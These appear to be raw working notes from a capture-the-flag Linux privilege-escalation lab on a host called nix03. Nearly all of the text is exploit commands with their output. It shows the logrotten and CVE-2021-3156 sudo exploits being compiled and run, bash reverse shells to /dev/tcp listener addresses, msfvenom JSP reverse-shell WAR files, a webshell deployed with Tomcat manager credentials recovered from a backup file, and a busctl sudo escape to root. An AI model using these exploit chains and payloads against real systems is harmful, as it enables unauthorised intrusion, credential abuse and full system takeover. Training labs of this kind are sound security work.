-rw-r----- 1 root adm     0 Sep  4  2020 access.log
-rw-r----- 1 root adm 57788 Sep  2  2020 access.log.1
-rw-r----- 1 root adm   239 Jan 25 18:19 error.log
-rw-r----- 1 root adm   869 Jan 25 18:19 error.log.1
-rw-r----- 1 root adm   413 Sep  8  2020 error.log.2.gz
-rw-r----- 1 root adm   436 Sep  7  2020 error.log.3.gz
-rw-r----- 1 root adm   533 Sep  6  2020 error.log.4.gz
-rw-r----- 1 root adm   339 Sep  5  2020 error.log.5.gz
-rw-r----- 1 root adm  2424 Sep  4  2020 error.log.6.gz
-rw-r----- 1 root adm  1179 Jan 25 19:10 other_vhosts_access.log
-rw-r----- 1 root adm   368 Sep  7  2020 other_vhosts_access.log.1
-rw-r----- 1 root adm  2207 Sep  6  2020 other_vhosts_access.log.2.gz
-rw-r----- 1 root adm  2967 Sep  2  2020 other_vhosts_access.log.3.gz


- logrotate must run as a privileged user or root
- vulnerable versions:
3.8.6
3.11.0
3.15.0
3.18.0

### Exploit

git clone https://github.com/whotwagner/logrotten.git
scp -r logrotten barry@10.129.122.218:/home/barry/logrotten/
i_l0ve_s3cur1ty!

cd logrotten
gcc logrotten.c -o logrotten
echo 'bash -i >& /dev/tcp/10.10.15.118/9001 0>&1' > payload

On our attack host :s
nc -nlvp 9001

./logrotten -p ./payload /home/htb-student/backups/access.log
Waiting for rotating /home/htb-student/backups/access.log...

echo 11 > /var/log/tomcat9/catalina.out

Renamed /home/htb-student/backups with /home/htb-student/backups2 and created symlink to /etc/bash_completion.d
Waiting 1 seconds before writing payload...
Done!

nc -nlvp 9001


## Weak NFS Privileges

showmount -e 10.129.122.218

Command 'showmount' not found, but can be installed with:

apt install nfs-common
Please ask your administrator.

# Vulnerability

CVE-2021-3156 affects :

1.8.31 - Ubuntu 20.04
1.8.27 - Debian 10
1.9.2 - Fedora 33
and others

1) Find version :

sudo -V | head -n1
Sudo version 1.8.31

cat /etc/lsb-release

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"

2) Upload exploit

git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
rm -rf libnss_X
mkdir libnss_X
gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c

mkdir CVE-2021-3156

scp sudo-hax-me-a-sandwich CVE-2021-3156 barry@10.129.105.45:/home/barry/CVE-2021-3156/
i_l0ve_s3cur1ty!

cd CVE-2021-3156

./sudo-hax-me-a-sandwich


3) Run exploit

./sudo-hax-me-a-sandwich

  available targets:
  ------------------------------------------------------------
    0) Ubuntu 18.04.5 (Bionic Beaver) - sudo 1.8.21, libc-2.27
    1) Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31
    2) Debian 10.0 (Buster) - sudo 1.8.27, libc-2.28
  ------------------------------------------------------------

4) Choose option depending on OS version

Here :
DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"

So :
./sudo-hax-me-a-sandwich 1

** CVE-2021-3156 PoC by blasty <peter@haxx.in>

using target: Ubuntu 20.04.1 (Focal Fossa) - sudo 1.8.31, libc-2.31 ['/usr/bin/sudoedit'] (56, 54, 63, 212)
** pray for your rootshell.. **
[sudo] password for barry: 
barry is not in the sudoers file.  This incident will be reported.


## Sudo Policy Bypass

sudo -u#-1 id

sudo -u#-1 id
sudo: unknown user: #-1
sudo: unable to initialize policy plugin


10.129.105.45:8080

http://10.129.105.45:8080/manager/html

<user username="tomcat" password="s3cret" roles="manager-gui"/>

tomcat-users.xml


find / -type f -name tomcat-users.*  -exec ls -l {} \; 2>/dev/null

-rw-r----- 1 root tomcat 2232 Sep  5  2020 /etc/tomcat9/tomcat-users.xml
-rwxr-xr-x 1 root barry 2232 Sep  5  2020 /etc/tomcat9/tomcat-users.xml.bak
-rw-r--r-- 1 root root 2161 Sep  5  2020 /usr/share/tomcat9/etc/tomcat-users.xml

cat /etc/tomcat9/tomcat-users.xml.bak

 <user username="tomcatadm" password="T0mc@t_s3cret_p@ss!" roles="manager-gui, manager-script, manager-jmx, manager-status, admin-gui, admin-script"/>

http://10.129.105.45:8080/manager/html
tomcatadm
T0mc@t_s3cret_p@ss!

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.118 LPORT=4443 -f war > backup.war
nc -lnvp 4443

wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
zip -r backup2.war cmd.jsp
Browse
select the .war file
Deploy

--> This file is uploaded to the manager GUI, after which the /backup application will be added to the table

http://10.129.105.45:8080/backup2/cmd.jsp

Command: id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)

grep -Rnw '/var/log/' -e 'LLPE{.*}'

find / -type f -name flag4.*  -exec ls -l {} \; 2>/dev/null

barry@nix03:~$ find / -type f -name flag4.*  -exec ls -l {} \; 2>/dev/null
-rw------- 1 tomcat tomcat 25 Sep  5  2020 /var/lib/tomcat9/flag4.txt

From webshell :
cat /var/lib/tomcat9/flag4.txt
LLPE{im_th3_m@nag3r_n0w}

### Exploit

git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten

scp logrotten barry@10.129.78.151:/home/barry/
i_l0ve_s3cur1ty!


ls -l /var/log/tomcat9/

touch /var/log/tomcat9/catalina.out
echo 'bash -i >& /dev/tcp/10.10.14.179/9001 0>&1' > payload
./logrotten -p ./payload /var/log/tomcat9/catalina.out
logrotate -f /etc/logrotate.d/tomcat9

nc -nlvp 9001

echo 11 > /var/log/tomcat9/catalina.out

find / -type f -name logrotate.*  -exec ls -l {} \; 2>/dev/null

Command: logrotate --version

logrotate 3.14.0

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes


--> logrotate not vulnerable

Command: sudo -l

Matching Defaults entries for tomcat on nix03:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User tomcat may run the following commands on nix03:
    (root) NOPASSWD: /usr/bin/busctl

https://gtfobins.github.io/gtfobins/busctl/

msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.179 LPORT=4444 -f war > reverse.war

Payload size: 1106 bytes
Final size of war file: 1106 bytes


nc -lnvp 4444
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)
sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'

python -c 'import pty; pty.spawn("/bin/bash")'
--> Nothing

which python
--> Nothing

sudo msfconsole -q
set LHOST 10.10.14.179
set LPORT 4445
set RHOSTS 10.129.78.151
set HttpPassword T0mc@t_s3cret_p@ss!
set HttpUsername tomcatadm
set RPORT 8080

[*] Started reverse TCP handler on 10.10.14.179:4445 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying dyBKOBSelWflZHqT3yZOLNh...
[*] Executing dyBKOBSelWflZHqT3yZOLNh...
[*] Undeploying dyBKOBSelWflZHqT3yZOLNh ...
[*] Undeployed at /manager/html/undeploy
[*] Exploit completed, but no session was created.

nc -lvnp 4444
python3 -c 'import pty; pty.spawn("/bin/bash")'

python3 -c 'import pty; pty.spawn("/bin/bash")'
tomcat@nix03:/var/lib/tomcat9$ 

sudo busctl --show-machine

tomcat@nix03:/var/lib/tomcat9$ sudo busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
<:path=/bin/sh,argv1=-c,argv2='/bin/sh -i 0<&2 1>&2'
```
# id
id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/flag5.txt
cat /root/flag5.txt
LLPE{0ne_sudo3r_t0_ru13_th3m_@ll!}
```